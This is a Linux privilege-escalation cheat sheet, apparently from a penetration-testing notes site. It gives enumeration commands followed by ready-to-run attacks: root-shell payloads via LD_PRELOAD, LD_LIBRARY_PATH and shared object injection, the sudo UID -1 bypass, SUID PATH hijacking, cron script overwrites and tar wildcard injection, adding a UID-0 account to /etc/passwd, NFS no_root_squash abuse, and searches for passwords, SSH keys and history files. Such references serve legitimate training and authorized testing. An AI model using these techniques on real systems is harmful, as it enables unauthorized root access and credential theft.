---
title: Linux Priv E
subtitle: LINUX PRIVESC

sidebar:
  - label: ENUMERATION
    items:
      - id: lpe-enum-system
        text: "System Info"
      - id: lpe-enum-users
        text: "Users & Groups"
      - id: lpe-enum-network
        text: "Network"
      - id: lpe-enum-processes
        text: "Processes & Services"
      - id: lpe-enum-files
        text: "File Permissions"
  - label: EXPLOITATION
    items:
      - id: lpe-kernel
        text: "Kernel Exploits"
      - id: lpe-sudo
        text: "Sudo Abuse"
      - id: lpe-suid
        text: "SUID / SGID"
      - id: lpe-capabilities
        text: "Capabilities"
      - id: lpe-cron
        text: "Cron Jobs"
      - id: lpe-writable
        text: "Writable Files"
      - id: lpe-so-injection
        text: "Shared Object Injection"
      - id: lpe-nfs
        text: "NFS"
      - id: lpe-passwords
        text: "Credentials"
---

## SYSTEM INFO
<!-- id: lpe-enum-system -->

> Start every engagement by fingerprinting the OS, kernel, and architecture. Kernel version feeds directly into exploit suggester lookups. CPU architecture matters when cross-compiling exploits.

### OS and kernel

#### bash | OS release and kernel version
```
uname -a
cat /etc/os-release
cat /etc/issue
```

#### bash | CPU architecture
```
lscpu
file /bin/bash
```

#### bash | Mounted filesystems and disk layout
```
lsblk
df -h
cat /etc/fstab
```

#### bash | Installed packages (Debian / Ubuntu)
```
dpkg -l
```

#### bash | Installed packages (RHEL / CentOS)
```
rpm -qa
```

## USERS & GROUPS
<!-- id: lpe-enum-users -->

> Identify all users, privileged accounts, and group memberships. UID 0 accounts other than root are an immediate red flag. Accounts with real shell access are targets.

### Users

#### bash | Current user context
```
whoami
id
groups
```

#### bash | All users with shell access
```
cat /etc/passwd | grep -v -E "nologin|false"
```

#### bash | UID 0 accounts (should only be root)
```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
```

#### bash | All groups
```
cat /etc/group
```

#### bash | Currently logged in users and activity
```
w
who
pinky
```

#### bash | Recent login history
```
last
lastlog | grep -v "Never"
```

## NETWORK
<!-- id: lpe-enum-network -->

> Internal open ports are a common privesc path — services bound to localhost that are not externally exposed may run as root or have weaker authentication.

### Interfaces and ports

#### bash | Network interfaces
```
ip a
ifconfig 2>/dev/null
```

#### bash | Listening ports including process names
```
ss -tulpn
netstat -tulpn 2>/dev/null
```

#### bash | Routing table
```
ip route
route -n 2>/dev/null
```

#### bash | DNS and hostname
```
hostname
dnsdomainname
cat /etc/resolv.conf
cat /etc/hosts
```

#### bash | Firewall rules
```
iptables -L 2>/dev/null
```

## PROCESSES & SERVICES
<!-- id: lpe-enum-processes -->

> Processes running as root are high-value targets. Identify versions of running services and check for known CVEs. pspy lets you monitor processes in real time without needing root — useful for catching short-lived cron jobs.

### Running processes

#### bash | All processes with full command line
```
ps aux
```

#### bash | Processes running as root only
```
ps aux | grep "^root"
```

#### bash | Check specific service version
```
dpkg -l | grep <program>
<program> --version
```

#### bash | Live process monitor without root (pspy)
```
# Download: https://github.com/DominicBreuker/pspy
chmod +x pspy64
./pspy64
```

## FILE PERMISSIONS
<!-- id: lpe-enum-files -->

> Writable files owned by root, writable directories in PATH, and readable sensitive files are all privesc paths. Limit depth to avoid timeouts on large filesystems.

### Permission checks

#### bash | Writable directories (up to 5 levels deep)
```
find / -maxdepth 5 -executable -writable -type d 2>/dev/null
```

#### bash | Writable files (excluding noise)
```
find / -maxdepth 5 -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

#### bash | Readable files in sensitive locations
```
find /etc /opt /var /tmp -readable -type f 2>/dev/null
```

#### bash | Recently modified files (last 10 minutes)
```
find / -type f -mmin -10 2>/dev/null | grep -v proc | grep -v sys
```

## KERNEL EXPLOITS
<!-- id: lpe-kernel -->

> Always check the kernel version. Older kernels have well-documented public exploits. DirtyCow affects kernels < 4.8.3. Cross-compile on your attack box if the target lacks a compiler.

### Enumeration and exploitation

#### bash | Get kernel version
```
uname -r
uname -a
```

#### bash | Linux Exploit Suggester
```
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Check by kernel version from attacker machine:
./linux-exploit-suggester.sh --kernelversion <version>
```

#### bash | Cross-compile exploit for x86-64 on ARM attacker box
```
x86_64-linux-gnu-gcc exploit.c -o exploit -static
x86_64-linux-gnu-gcc -shared -fPIC library.c -o lib.so
```

> Resources: <a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank">linux-exploit-suggester</a> · <a href="https://www.linuxkernelcves.com/" target="_blank">linuxkernelcves.com</a> · <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank">DirtyCow PoCs</a>

## SUDO ABUSE
<!-- id: lpe-sudo -->

> sudo -l is always the first check after landing a shell. Any allowed binary may be abusable via GTFOBins. LD_PRELOAD and LD_LIBRARY_PATH attacks require env_keep to be set in sudoers — check the Defaults line carefully.

### Basic sudo

#### bash | List all sudo permissions
```
sudo -l
```

#### bash | Run command as another user
```
sudo -u <user> /bin/bash
sudo -u <user> <command>
```

> Check every allowed binary at <a href="https://gtfobins.github.io" target="_blank">gtfobins.github.io</a>

### LD_PRELOAD (env_keep bypass)

> Requires `env_keep+=LD_PRELOAD` in sudoers Defaults and at least one program you can run as root. The shared object's _init() runs before anything else — spawn a shell there.

#### bash | Check if env_keep is set
```
sudo -l
# Look for: env_keep+=LD_PRELOAD in the Defaults section
```

#### bash | Compile and use LD_PRELOAD payload
```
# preload.c:
# #include <stdio.h>
# #include <sys/types.h>
# #include <stdlib.h>
# void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }

gcc -fPIC -shared -nostartfiles preload.c -o /tmp/preload.so
sudo LD_PRELOAD=/tmp/preload.so <allowed_program>
```

### LD_LIBRARY_PATH (env_keep bypass)

> Requires `env_keep+=LD_LIBRARY_PATH`. Use ldd to find which .so files a sudo-allowed binary loads, then replace one with a malicious version in a directory you control.

#### bash | Find shared libraries used by sudo binary
```
ldd /path/to/<allowed_program>
```

#### bash | Compile hijack library and execute
```
# library_path.c:
# #include <stdio.h>
# #include <stdlib.h>
# static void hijack() __attribute__((constructor));
# void hijack() { unsetenv("LD_LIBRARY_PATH"); setresuid(0,0,0); system("/bin/bash -p"); }

gcc -shared -fPIC library_path.c -o /tmp/<libname>.so
sudo LD_LIBRARY_PATH=/tmp <allowed_program>
```

### CVE-2019-14287

#### bash | UID -1 bypass (sudo < 1.8.28)
```
# Requires: (ALL, !root) in sudoers entry
sudo -u#-1 /bin/bash
```

## SUID / SGID
<!-- id: lpe-suid -->

> SUID binaries execute with the file owner's privileges. If owned by root, they run as root. LD_PRELOAD and LD_LIBRARY_PATH do NOT work with SUID. SUID uses the executing user's PATH — which can be hijacked if the binary calls programs without full paths.

### Find SUID / SGID

#### bash | Find all SUID and SGID binaries
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

> Check every result at <a href="https://gtfobins.github.io" target="_blank">gtfobins.github.io</a>

### PATH hijacking via SUID

> If a SUID binary calls another program without a full path, prepend a writable directory to PATH and drop a malicious binary with the same name there.

#### bash | Find unsafe calls using strace
```
strace -v -f -e execve <SUID_binary> 2>&1 | grep -v ENOENT
```

#### bash | Find unsafe calls using strings
```
strings <SUID_binary>
```

#### bash | Exploit — prepend writable dir to PATH
```
# Compile a payload named after the called binary:
# int main() { setuid(0); system("/bin/bash -p"); }
gcc payload.c -o <called_binary_name> -static
PATH=.:$PATH <SUID_binary>
```

### Writable shared objects

#### bash | Check shared objects used by SUID binary
```
ldd <SUID_binary>
```

#### bash | Check if any .so path is writable
```
ls -la /path/to/used.so
find / -name "*.so" -writable 2>/dev/null
```

## CAPABILITIES
<!-- id: lpe-capabilities -->

> Capabilities are a fine-grained alternative to SUID. cap_setuid lets a binary change its UID to 0 without being fully SUID. cap_dac_override bypasses all file permission checks. Exploitation mirrors SUID abuse.

### Find and exploit capabilities

#### bash | Find all binaries with capabilities set
```
getcap -r / 2>/dev/null
```

#### bash | Example — python3 with cap_setuid
```
# If: python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> Notable caps: `cap_setuid`, `cap_dac_override`, `cap_sys_admin`, `cap_net_raw`. Check at <a href="https://gtfobins.github.io" target="_blank">gtfobins.github.io</a>

## CRON JOBS
<!-- id: lpe-cron -->

> Root cron jobs are reliable privesc targets. Three angles: write to the script itself, hijack via PATH, or wildcard injection. pspy catches cron jobs not visible in crontab files.

### Enumerate

#### bash | All crontab locations
```
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null
crontab -l
```

#### bash | Check permissions on cron scripts
```
find /etc/cron* /var/spool/cron -type f 2>/dev/null | xargs ls -la 2>/dev/null
```

### Writable script

#### bash | Overwrite cron script with payload
```
echo 'chmod +s /bin/bash' >> /path/to/cron/script.sh
# Wait for cron to run, then:
/bin/bash -p
```

### PATH hijacking

#### bash | Check crontab PATH and plant malicious binary
```
cat /etc/crontab
# If PATH=/home/user:/usr/local/sbin:... and /home/user is writable:
echo 'chmod +s /bin/bash' > /home/user/<script_called_by_cron>
chmod +x /home/user/<script_called_by_cron>
# Wait for cron, then: /bin/bash -p
```

### Wildcard injection

> If a cron script uses tar with a wildcard over a directory you control, filenames that look like flags get interpreted by tar as arguments. Classic technique.

#### bash | Exploit tar wildcard in cron
```
# If cron runs: tar czf /tmp/backup.tar.gz /home/user/*
echo 'chmod +s /bin/bash' > /home/user/shell.sh
touch '/home/user/--checkpoint=1'
touch '/home/user/--checkpoint-action=exec=sh shell.sh'
# Wait for cron, then:
/bin/bash -p
```

## WRITABLE FILES & PATHS
<!-- id: lpe-writable -->

> /etc/passwd writable is an instant root. If /etc/shadow is readable, crack hashes offline. Also look for root-owned scripts sourced by services or login processes.

### File abuse

#### bash | World-writable files
```
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v /dev
```

#### bash | /etc/passwd writable — add root user
```
# Generate password hash:
openssl passwd -1 password123

# Append new root user:
echo 'hax:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax
```

#### bash | /etc/shadow readable — crack hashes
```
cat /etc/shadow
# Copy the $6$ hash to a file and crack:
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt
```

#### bash | Create a password hash manually
```
mkpasswd -m sha-512 password123
```

## SHARED OBJECT INJECTION
<!-- id: lpe-so-injection -->

> If a SUID binary or root-run process tries to load a shared object that does not exist, and the missing path is writable, you can plant a malicious .so there. strace reveals every missing file lookup.

### Find and exploit

#### bash | Find missing .so files via strace
```
strace <binary_path> 2>&1 | grep -iE "open|access|no such file"
```

#### bash | Compile malicious shared object
```
# rootbash_so.c:
# #include <stdio.h>
# #include <stdlib.h>
# static void inject() __attribute__((constructor));
# void inject() { setuid(0); system("/bin/bash -p"); }

gcc -shared -fPIC rootbash_so.c -o <missing_libname>.so
cp <missing_libname>.so /writable/path/
```

## NFS
<!-- id: lpe-nfs -->

> no_root_squash means a remote root user is treated as root on the NFS share rather than mapped to nobody. If you have root on your attack box and can mount the share, create a SUID binary there and execute it on the target.

### Exploit no_root_squash

#### bash | Check exports for no_root_squash (on target)
```
cat /etc/exports
# Look for: no_root_squash
```

#### bash | View available shares (from attacker machine)
```
showmount -e <Target_IP>
```

#### bash | Mount and plant SUID payload (run as root on attacker)
```
mount -o rw,vers=2 <Target_IP>:<share_path> /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
```

#### bash | Execute on target
```
/mnt/<share_path>/rootbash -p
```

## CREDENTIALS & PASSWORDS
<!-- id: lpe-passwords -->

> Credentials turn up in config files, environment variables, history files, and SSH keys. Always grep broadly — developers leave passwords in unexpected places.

### Search for credentials

#### bash | Config files with password strings
```
grep -rE "(password|passwd|secret|key|token)" /etc /home /var /opt 2>/dev/null --include="*.conf" --include="*.config" --include="*.ini" --include="*.env" -l
```

#### bash | Environment variables (current process and all)
```
env
cat /proc/self/environ | tr '\0' '\n'
```

#### bash | Shell history files
```
cat ~/.bash_history
cat ~/.zsh_history 2>/dev/null
find / -name ".*_history" 2>/dev/null
```

#### bash | SSH private keys
```
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null
```

#### bash | Database connection strings
```
grep -rE "(db_pass|database_password|DB_PASSWORD|mysql|mongodb)" /var/www /opt /home 2>/dev/null -l
```
